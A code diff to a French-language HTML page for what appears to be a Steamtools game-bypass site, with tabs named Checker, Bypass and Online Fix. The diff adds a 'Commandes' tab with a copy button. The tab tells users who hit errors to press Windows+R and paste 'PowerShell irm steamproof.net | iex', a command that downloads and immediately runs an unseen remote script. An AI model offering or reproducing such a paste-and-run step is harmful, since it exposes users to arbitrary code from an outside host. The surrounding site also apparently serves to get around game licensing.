@@ -64,6 +64,17 @@
         position: relative;
         z-index: 1;
     }
+    
+    @keyframes copyPop {
+    0% { transform: scale(1); }
+    40% { transform: scale(1.15); }
+    100% { transform: scale(1); }
+}
+
+.copy-anim {
+    animation: copyPop 0.25s ease;
+    box-shadow: 0 0 12px rgba(0,255,153,0.6);
+}
 
     /* HEADER */
     .header {
@@ -690,8 +701,9 @@
     <button class="tab-button" onclick="switchTab(1)">🎮 Checker</button>
     <button class="tab-button" onclick="switchTab(2)">🔓 Bypass</button>
     <button class="tab-button" onclick="switchTab(3)">🌐 Online Fix</button>
-    <button class="tab-button" onclick="switchTab(4)">❓ FAQ</button>
-    <button class="tab-button" onclick="switchTab(5)">⚙️ Paramètres</button>
+    <button class="tab-button" onclick="switchTab(4)">⌨️ Commandes</button>
+    <button class="tab-button" onclick="switchTab(5)">❓ FAQ</button>
+    <button class="tab-button" onclick="switchTab(6)">⚙️ Paramètres</button>
 </div>
 
 <!-- CONTENU -->
@@ -852,9 +864,82 @@
             </p>
         </div>
     </div>
+    
+<!-- TAB 4 - COMMANDES -->
+<div id="tab-4" class="tab-content">
+    <div class="bypass-container" style="padding: 40px 20px; text-align: center;">
+        
+        <h1 class="bypass-title" style="font-size: 2.1rem;">⌨️ Commandes</h1>
 
-    <!-- TAB 4 -->
-    <div id="tab-4" class="tab-content">
+        <p style="font-size: 1.1rem; line-height: 1.7; max-width: 620px; margin: 20px auto 30px; opacity: 0.9;">
+            Des fois, Steamtools a des problèmes. C'est pour ça que cet onglet regroupe les commandes pour réparer les problèmes liés.
+        </p>
+
+        <p style="font-size: 1rem; opacity: 0.85; max-width: 580px; margin: 0 auto 15px;">
+            Si vous avez des problèmes comme <strong>“Pas de connexion internet”</strong>, <strong>“Téléchargement en attente”</strong> ou <strong>“Erreur inconnue”</strong>, Appuyez sur Windows + R sur votre clavier, puis collez cette commande :
+        </p>
+
+        <!-- COMMAND BOX -->
+        <div style="
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            max-width: 580px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #121212, #181818);
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            padding: 14px 14px 14px 16px;
+            font-family: monospace;
+            color: #00ff99;
+            box-shadow: 0 0 16px rgba(0,255,153,0.08);
+        ">
+            <span id="cmd-text">PowerShell irm steamproof.net | iex</span>
+
+            <button type="button" onclick="copyCommand()" style="
+                background: #00ff99;
+                border: none;
+                padding: 8px 14px;
+                border-radius: 8px;
+                cursor: pointer;
+                font-weight: bold;
+                color: #000;
+                white-space: nowrap;
+                transition: 0.2s;
+            " onmouseover="this.style.opacity='0.8'" onmouseout="this.style.opacity='1'">
+                Copier
+            </button>
+        </div>
+
+        <p style="font-size: 0.95rem; opacity: 0.8; max-width: 580px; margin: 0 auto;">
+            Pense aussi à consulter l’onglet <strong>FAQ</strong>.
+        </p>
+    </div>
+</div>
+
+<script>
+function copyCommand() {
+    const text = document.getElementById("cmd-text").innerText;
+    const btn = event.currentTarget;
+
+    navigator.clipboard.writeText(text);
+
+    const originalText = btn.innerText;
+
+    // animation
+    btn.innerText = "Copié ✔";
+    btn.classList.add("copy-anim");
+
+    setTimeout(() => {
+        btn.innerText = originalText;
+        btn.classList.remove("copy-anim");
+    }, 1000);
+}
+</script>
+
+    <!-- TAB 5 -->
+    <div id="tab-5" class="tab-content">
         <div class="faq-container">
             <h1 class="faq-title">FAQ</h1>
             <div class="faq-item">
@@ -880,8 +965,8 @@
         </div>
     </div>
 
-    <!-- TAB 5 -->
-    <div id="tab-5" class="tab-content">
+    <!-- TAB 6 -->
+    <div id="tab-6" class="tab-content">
         <div class="settings-container">
             <h1 class="settings-title">⚙️ Paramètres</h1>
             <div class="settings-section">
@@ -941,8 +1026,9 @@
     <button class="bottom-nav-btn" onclick="switchTab(1)"><span class="bn-icon">🎮</span>Checker</button>
     <button class="bottom-nav-btn" onclick="switchTab(2)"><span class="bn-icon">🔓</span>Bypass</button>
     <button class="bottom-nav-btn" onclick="switchTab(3)"><span class="bn-icon">🌐</span>Online Fix</button>
-    <button class="bottom-nav-btn" onclick="switchTab(4)"><span class="bn-icon">❓</span>FAQ</button>
-    <button class="bottom-nav-btn" onclick="switchTab(5)"><span class="bn-icon">⚙️</span>Params</button>
+    <button class="bottom-nav-btn" onclick="switchTab(4)"><span class="bn-icon">⌨️</span>Commandes</button>
+    <button class="bottom-nav-btn" onclick="switchTab(5)"><span class="bn-icon">❓</span>FAQ</button>
+    <button class="bottom-nav-btn" onclick="switchTab(6)"><span class="bn-icon">⚙️</span>Params</button>
 </nav>
 
 <!-- MODAL RDR2 -->
